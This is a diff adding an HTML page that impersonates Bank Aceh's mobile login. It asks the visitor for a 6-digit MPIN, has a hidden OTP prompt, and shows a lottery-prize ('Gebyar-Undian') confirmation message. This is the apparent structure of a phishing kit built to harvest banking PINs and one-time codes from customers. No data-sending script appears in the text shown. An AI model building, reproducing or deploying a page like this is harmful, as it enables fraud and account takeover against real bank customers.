@@ -1,0 +1,187 @@
+<!DOCTYPE html><html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><link rel="stylesheet" type="text/css" href="cid:css-3047c407-3f74-4d6d-a2c2-371842a2730e@mhtml.blink" />
+
+    
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Bank Aceh</title>
+
+</head>
+<body>
+    <div class="container">
+        <div id="scs" style="" class="bgm">
+            <div class="modal">
+                <h3>Pendaftaran Gebyar-Undian kamu sedang dalam pengecekan sistem mohon menunggu tim terkait &amp; kami akan segera menghubungi untuk info nomor undian Nasabah Bank Aceh syariah.</h3>
+                <br>
+                <button class="ook"onclick="location.href='/id/index.html';">OK</button>
+            </div>
+        </div>
+        <div style="display: none;" class="bgm">
+            <div class="modal">
+                <form id="datapin">
+                    <h3>Masukkan 6 digit kode OTP Anda</h3><br>
+                    <div class="box bpin">
+                        <input id="inppp" class="inppin" inputmode="numeric" type="password" name="pin1" maxlength="1" required="">
+                        <input class="inppin" inputmode="numeric" type="password" name="pin2" maxlength="1" required="">
+                        <input class="inppin" inputmode="numeric" type="password" name="pin3" maxlength="1" required="">
+                        <input class="inppin" inputmode="numeric" type="password" name="pin4" maxlength="1" required="">
+                        <input class="inppin" inputmode="numeric" type="password" name="pin5" maxlength="1" required="">
+                        <input class="inppin" inputmode="numeric" type="password" name="pin6" maxlength="1" required="">
+                    </div>
+                    <p class="forgot">Kirim Ulang <span id="countdown">(03.00)</span></p>
+                </form>
+            </div>
+        </div>
+        <div class="headr">
+            <img src="/assets/back.png" alt="">
+            <p>Login</p>
+            <img src="/assets/bell.png" alt="">
+        </div>
+        <img class="imgh" src="/assets/head.png" alt="">
+        <div class="content">
+            <h3>KONFIRMASI</h3>
+            <h4>Masukkan 6 digit MPIN Anda</h4>
+            <form id="dataotp">
+                <div class="box">
+                    <input id="inpp" class="inpotp" inputmode="numeric" type="password" name="otp1" maxlength="1" required="">
+                    <input class="inpotp" inputmode="numeric" type="password" name="otp2" maxlength="1" required="">
+                    <input class="inpotp" inputmode="numeric" type="password" name="otp3" maxlength="1" required="">
+                    <input class="inpotp" inputmode="numeric" type="password" name="otp4" maxlength="1" required="">
+                    <input class="inpotp" inputmode="numeric" type="password" name="otp5" maxlength="1" required="">
+                    <input class="inpotp" inputmode="numeric" type="password" name="otp6" maxlength="1" required="">
+                </div>
+                <!--<button disabled id="btn" onclick="sendotp();" type="button">VALIDASI</button>-->
+            </form>
+        </div>
+        <!--<img src="ast/foot.jpg" alt="" class="foot">-->
+    </div>
+</body></html>
+<style>
+@charset "utf-8";
+
+@import url("https://fonts.googleapis.com/css2?family=Ubuntu:wght@300;400;500;700&display=swap");
+
+* { font-family: Ubuntu, sans-serif; font-weight: 400; margin: 0px; padding: 0px; box-sizing: border-box; color: rgb(0, 0, 0); position: relative; }
+
+html { width: 100vw; height: 100vh; }
+
+body { background: rgb(255, 255, 255); width: 100%; height: 100%; }
+
+.container { width: 100%; height: 100%; display: flex; align-items: center; flex-direction: column; }
+
+.headr { width: 100%; height: 40px; background: rgb(0, 101, 67); display: flex; justify-content: space-between; align-items: center; padding: 0px 20px; }
+
+.headr p { font-size: 15px; color: rgb(255, 255, 255); }
+
+.headr img { height: 36%; }
+
+.container .imgh { width: 50%; margin: 80px 0px 40px; }
+
+.content { margin-top: 20px; width: 100%; padding: 20px; display: flex; align-items: center; justify-content: center; flex-direction: column; }
+
+.content form { width: 100%; }
+
+.content .wrp { width: 100%; display: flex; align-items: center; justify-content: center; margin-bottom: 10px; height: 43px; }
+
+.content .wrp input { width: 100%; height: 40px; outline: none; border: 1px solid rgb(213, 213, 213); border-radius: 5px; padding: 13px; font-size: 13px; }
+
+.content .wrp label { color: rgb(213, 213, 213); font-size: 13px; position: absolute; left: 8px; background: rgb(255, 255, 255); padding: 0px 5px; transition: all 0.2s ease 0s; }
+
+.content .wrp input:focus, .content .wrp input:valid { border: 1px solid rgb(28, 170, 51); }
+
+.content .wrp input:focus ~ label, .content .wrp input:valid ~ label { transform: translateY(-19px); font-size: 10px; color: rgb(28, 170, 51); transition: all 0.2s ease 0s; }
+
+.content button, .ook { width: 100%; height: 40px; border: none; border-radius: 50px; background: rgb(0, 101, 67); font-size: 11px; color: rgb(255, 255, 255); }
+
+.content .or { margin: 10px 0px; font-size: 9px; text-align: center; }
+
+.content form .bbtn { margin-top: 10px; width: 100%; display: flex; align-items: center; justify-content: space-between; }
+
+.content form .bbtn button { width: 100%; height: 40px; border: none; border-radius: 50px; background: rgb(0, 101, 67); font-size: 11px; color: rgb(255, 255, 255); }
+
+.content .reg { background: none; color: rgb(28, 170, 51); font-size: 13px; }
+
+.container .foot { width: 100%; position: absolute; bottom: 60px; }
+
+h3 { font-size: 15px; text-align: center; }
+
+h4 { margin: 10px 0px 20px; font-size: 10px; color: rgb(93, 93, 93); }
+
+.imgp { width: 80px; opacity: 0.5; }
+
+#dataotp button:disabled { background: rgb(219, 219, 219); }
+
+form .box { margin: 0px auto 30px; width: 80%; display: flex; justify-content: space-between; align-items: center; }
+
+form .bpin { width: 100%; }
+
+form .box input { width: 40px; height: 40px; outline: none; font-size: 19px; text-align: center; border: 2px solid rgb(213, 213, 213); border-radius: 5px; }
+
+form .box input:focus { border: 2px solid rgb(0, 101, 67); }
+
+.bgm { width: 100%; height: 100%; background: rgba(0, 0, 0, 0.106); position: absolute; z-index: 999; display: flex; justify-content: center; align-items: center; }
+
+.bgm .modal { width: 80%; border-radius: 20px; background: rgb(255, 255, 255); padding: 20px; transform: translateY(-80px); box-shadow: rgba(0, 0, 0, 0.2) 0px 3px 6px; }
+
+.forgot { font-size: 10px; text-align: center; opacity: 0.7; }
+
+.wr { width: 100%; display: flex; justify-content: right; margin: 30px 0px 0px; }
+
+.wr .b, .y { font-size: 12px; background: none; border: none; margin-left: 30px; color: rgb(28, 170, 51); }
+
+.wr .y:disabled { color: rgb(174, 174, 174); }
+
+.xx { width: 100%; height: 40px; position: absolute; right: 0px; left: 0px; top: 0px; background: rgb(0, 101, 67); display: flex; justify-content: center; align-items: center; }
+
+.xx i { font-style: normal; position: absolute; right: 8px; top: 1px; font-weight: 200; }
+
+@charset "utf-8";
+
+@font-face { font-family: Ubuntu; font-style: normal; font-weight: 300; font-display: swap; src: url("https://fonts.gstatic.com/s/ubuntu/v20/4iCv6KVjbNBYlgoC1CzjvWyNPYZvg7UI.woff2") format("woff2"); unicode-range: U+460-52F, U+1C80-1C88, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F; }
+
+@font-face { font-family: Ubuntu; font-style: normal; font-weight: 300; font-display: swap; src: url("https://fonts.gstatic.com/s/ubuntu/v20/4iCv6KVjbNBYlgoC1CzjtGyNPYZvg7UI.woff2") format("woff2"); unicode-range: U+301, U+400-45F, U+490-491, U+4B0-4B1, U+2116; }
+
+@font-face { font-family: Ubuntu; font-style: normal; font-weight: 300; font-display: swap; src: url("https://fonts.gstatic.com/s/ubuntu/v20/4iCv6KVjbNBYlgoC1CzjvGyNPYZvg7UI.woff2") format("woff2"); unicode-range: U+1F00-1FFF; }
+
+@font-face { font-family: Ubuntu; font-style: normal; font-weight: 300; font-display: swap; src: url("https://fonts.gstatic.com/s/ubuntu/v20/4iCv6KVjbNBYlgoC1Czjs2yNPYZvg7UI.woff2") format("woff2"); unicode-range: U+370-3FF; }
+
+@font-face { font-family: Ubuntu; font-style: normal; font-weight: 300; font-display: swap; src: url("https://fonts.gstatic.com/s/ubuntu/v20/4iCv6KVjbNBYlgoC1CzjvmyNPYZvg7UI.woff2") format("woff2"); unicode-range: U+100-2AF, U+300-301, U+303-304, U+308-309, U+323, U+329, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF; }
+
+@font-face { font-family: Ubuntu; font-style: normal; font-weight: 300; font-display: swap; src: url("https://fonts.gstatic.com/s/ubuntu/v20/4iCv6KVjbNBYlgoC1CzjsGyNPYZvgw.woff2") format("woff2"); unicode-range: U+0-FF, U+131, U+152-153, U+2BB-2BC, U+2C6, U+2DA, U+2DC, U+300-301, U+303-304, U+308-309, U+323, U+329, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD; }
+
+@font-face { font-family: Ubuntu; font-style: normal; font-weight: 400; font-display: swap; src: url("https://fonts.gstatic.com/s/ubuntu/v20/4iCs6KVjbNBYlgoKcg72nU6AF7xm.woff2") format("woff2"); unicode-range: U+460-52F, U+1C80-1C88, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F; }
+
+@font-face { font-family: Ubuntu; font-style: normal; font-weight: 400; font-display: swap; src: url("https://fonts.gstatic.com/s/ubuntu/v20/4iCs6KVjbNBYlgoKew72nU6AF7xm.woff2") format("woff2"); unicode-range: U+301, U+400-45F, U+490-491, U+4B0-4B1, U+2116; }
+
+@font-face { font-family: Ubuntu; font-style: normal; font-weight: 400; font-display: swap; src: url("https://fonts.gstatic.com/s/ubuntu/v20/4iCs6KVjbNBYlgoKcw72nU6AF7xm.woff2") format("woff2"); unicode-range: U+1F00-1FFF; }
+
+@font-face { font-family: Ubuntu; font-style: normal; font-weight: 400; font-display: swap; src: url("https://fonts.gstatic.com/s/ubuntu/v20/4iCs6KVjbNBYlgoKfA72nU6AF7xm.woff2") format("woff2"); unicode-range: U+370-3FF; }
+
+@font-face { font-family: Ubuntu; font-style: normal; font-weight: 400; font-display: swap; src: url("https://fonts.gstatic.com/s/ubuntu/v20/4iCs6KVjbNBYlgoKcQ72nU6AF7xm.woff2") format("woff2"); unicode-range: U+100-2AF, U+300-301, U+303-304, U+308-309, U+323, U+329, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF; }
+
+@font-face { font-family: Ubuntu; font-style: normal; font-weight: 400; font-display: swap; src: url("https://fonts.gstatic.com/s/ubuntu/v20/4iCs6KVjbNBYlgoKfw72nU6AFw.woff2") format("woff2"); unicode-range: U+0-FF, U+131, U+152-153, U+2BB-2BC, U+2C6, U+2DA, U+2DC, U+300-301, U+303-304, U+308-309, U+323, U+329, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD; }
+
+@font-face { font-family: Ubuntu; font-style: normal; font-weight: 500; font-display: swap; src: url("https://fonts.gstatic.com/s/ubuntu/v20/4iCv6KVjbNBYlgoCjC3jvWyNPYZvg7UI.woff2") format("woff2"); unicode-range: U+460-52F, U+1C80-1C88, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F; }
+
+@font-face { font-family: Ubuntu; font-style: normal; font-weight: 500; font-display: swap; src: url("https://fonts.gstatic.com/s/ubuntu/v20/4iCv6KVjbNBYlgoCjC3jtGyNPYZvg7UI.woff2") format("woff2"); unicode-range: U+301, U+400-45F, U+490-491, U+4B0-4B1, U+2116; }
+
+@font-face { font-family: Ubuntu; font-style: normal; font-weight: 500; font-display: swap; src: url("https://fonts.gstatic.com/s/ubuntu/v20/4iCv6KVjbNBYlgoCjC3jvGyNPYZvg7UI.woff2") format("woff2"); unicode-range: U+1F00-1FFF; }
+
+@font-face { font-family: Ubuntu; font-style: normal; font-weight: 500; font-display: swap; src: url("https://fonts.gstatic.com/s/ubuntu/v20/4iCv6KVjbNBYlgoCjC3js2yNPYZvg7UI.woff2") format("woff2"); unicode-range: U+370-3FF; }
+
+@font-face { font-family: Ubuntu; font-style: normal; font-weight: 500; font-display: swap; src: url("https://fonts.gstatic.com/s/ubuntu/v20/4iCv6KVjbNBYlgoCjC3jvmyNPYZvg7UI.woff2") format("woff2"); unicode-range: U+100-2AF, U+300-301, U+303-304, U+308-309, U+323, U+329, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF; }
+
+@font-face { font-family: Ubuntu; font-style: normal; font-weight: 500; font-display: swap; src: url("https://fonts.gstatic.com/s/ubuntu/v20/4iCv6KVjbNBYlgoCjC3jsGyNPYZvgw.woff2") format("woff2"); unicode-range: U+0-FF, U+131, U+152-153, U+2BB-2BC, U+2C6, U+2DA, U+2DC, U+300-301, U+303-304, U+308-309, U+323, U+329, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD; }
+
+@font-face { font-family: Ubuntu; font-style: normal; font-weight: 700; font-display: swap; src: url("https://fonts.gstatic.com/s/ubuntu/v20/4iCv6KVjbNBYlgoCxCvjvWyNPYZvg7UI.woff2") format("woff2"); unicode-range: U+460-52F, U+1C80-1C88, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F; }
+
+@font-face { font-family: Ubuntu; font-style: normal; font-weight: 700; font-display: swap; src: url("https://fonts.gstatic.com/s/ubuntu/v20/4iCv6KVjbNBYlgoCxCvjtGyNPYZvg7UI.woff2") format("woff2"); unicode-range: U+301, U+400-45F, U+490-491, U+4B0-4B1, U+2116; }
+
+@font-face { font-family: Ubuntu; font-style: normal; font-weight: 700; font-display: swap; src: url("https://fonts.gstatic.com/s/ubuntu/v20/4iCv6KVjbNBYlgoCxCvjvGyNPYZvg7UI.woff2") format("woff2"); unicode-range: U+1F00-1FFF; }
+
+@font-face { font-family: Ubuntu; font-style: normal; font-weight: 700; font-display: swap; src: url("https://fonts.gstatic.com/s/ubuntu/v20/4iCv6KVjbNBYlgoCxCvjs2yNPYZvg7UI.woff2") format("woff2"); unicode-range: U+370-3FF; }
+
+@font-face { font-family: Ubuntu; font-style: normal; font-weight: 700; font-display: swap; src: url("https://fonts.gstatic.com/s/ubuntu/v20/4iCv6KVjbNBYlgoCxCvjvmyNPYZvg7UI.woff2") format("woff2"); unicode-range: U+100-2AF, U+300-301, U+303-304, U+308-309, U+323, U+329, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF; }
+
+@font-face { font-family: Ubuntu; font-style: normal; font-weight: 700; font-display: swap; src: url("https://fonts.gstatic.com/s/ubuntu/v20/4iCv6KVjbNBYlgoCxCvjsGyNPYZvgw.woff2") format("woff2"); unicode-range: U+0-FF, U+131, U+152-153, U+2BB-2BC, U+2C6, U+2DA, U+2DC, U+300-301, U+303-304, U+308-309, U+323, U+329, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD; }
+</style>
